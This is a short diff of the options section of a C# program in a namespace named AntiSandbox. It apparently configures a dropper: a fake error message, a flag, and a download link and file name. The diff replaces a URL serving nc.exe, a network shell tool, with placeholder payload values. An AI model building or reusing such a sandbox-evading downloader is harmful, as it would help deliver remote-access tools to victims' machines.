@@ -17,8 +17,8 @@ namespace AntiSandbox
             bool dev = false;                         
             bool fakem = true;
             string message = "An unknown error appeared. Please try again"; 
-            string link = "https://iiii.lol/nc.exe";
-            string name = "nc.exe";                   
+            string link = "https://example.com/payload.exe";
+            string name = "processname.exe";                   
             ///     --- OPTIONS---     ///
            ///////////////////////////////
 
